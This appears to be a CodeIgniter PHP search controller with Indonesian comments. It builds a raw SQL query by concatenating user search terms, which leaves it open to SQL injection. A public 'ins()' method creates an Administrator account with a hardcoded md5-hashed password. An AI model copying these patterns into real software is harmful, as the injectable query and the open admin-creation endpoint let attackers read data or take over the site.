<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class Cari extends CI_Controller {
	function __construct() {
		parent::__construct();
	}
	public function index() {
		$g = $this->input->get();
		$kk = $this->security->xss_clean($g['q_cari']);
        $kk = trim($kk);
        if (strlen($kk) < 3) {
            $this->session->set_flashdata('k','<div class="alert alert-danger">Masukkan kata kunci</div>');
        } else if ($kk == "") {
            $this->session->set_flashdata('k','<div class="alert alert-danger">Masukkan kata kunci</div>');
        } else {
    		$this->db->where("katakunci", $kk);
    		$cek_sudah_ada = $this->db->get("katakunci")->num_rows();
    		if ($cek_sudah_ada < 1) {
    			$this->db->insert("katakunci", array("katakunci"=>$kk, "jml"=>1));
    		} else {
    			$this->db->where("katakunci", $kk);
    			$this->db->set("jml", "jml+1", FALSE);
    			$this->db->update("katakunci");
        		
                $this->db->like('judul', $kk);
        		$this->db->or_like('konten', $kk);
        		$this->db->order_by("id", "desc");
        		$d['q_hasil'] = $this->db->get("halaman")->result_array();

                $kata_kunci_split = preg_split('/[\s]+/', $kk);
                $total_kata_kunci = count($kata_kunci_split);

        		// $this->db->where('publikasi', 1);

                $where = "";

                foreach($kata_kunci_split as $key=>$kunci){
                    //set variabel $where untuk query nanti
                    $where .= "konten LIKE '%".$kunci."%'";
                    //jika kata kunci lebih dari 1 (2 dan seterusnya) maka di tambahkan OR di perulangannya
                    if($key != ($total_kata_kunci - 1)){
                        $where .= " OR ";
                    }
                }

        		// $this->db->like('judul', $kk);
        		// $this->db->or_like('konten', $kk);
        		// $this->db->order_by("id", "desc");
        		
                $d['q_hasil2'] = $this->db->query("SELECT * FROM rss WHERE publikasi = 1 AND (".$where.") ORDER BY id DESC")->result_array();
            }
        }
		$d['p'] = "cari_informasi";
		$d['kk'] = $kk;
		$this->load->view('welcome_message', $d);
	}
	public function cari_ajaks() {
		$p = $this->input->post();
		
		$this->db->like('katakunci', $p['search']);
		$this->db->select("katakunci AS `value`, katakunci AS text");
		$d['data'] = $this->db->get("katakunci")->result_array();
		$d['success'] = true;
		j($d);
		exit;
	}

    public function ins() {
        $data = array(
            "user"=>"akhwan",
            "password"=>md5('akhwan'),
            "level"=>"Administrator",
            "tipe"=>"aktif"
        );
        $this->db->insert("useraura", $data);
    }
}
